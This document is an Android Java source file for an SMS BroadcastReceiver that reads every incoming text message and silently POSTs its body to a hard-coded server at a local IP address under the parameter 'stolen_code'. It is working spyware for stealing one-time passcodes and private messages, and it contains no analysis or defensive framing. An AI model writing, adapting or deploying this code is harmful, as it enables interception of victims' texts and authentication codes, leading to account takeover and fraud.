package com.example.minimalapp;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class SmsReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus != null) {
                for (Object pdu : pdus) {
                    SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                    String messageBody = sms.getMessageBody();
                    sendToServer(messageBody);
                }
            }
        }
    }

    private void sendToServer(final String message) {
        new Thread(() -> {
            try {
                // IP Address updated to match your KSWEB Server
                URL url = new URL("http://192.168.8.191:8080/save.php");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);

                String postData = "stolen_code=" + URLEncoder.encode(message, "UTF-8");
                OutputStream os = conn.getOutputStream();
                os.write(postData.getBytes("UTF-8"));
                os.flush();
                os.close();

                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
}
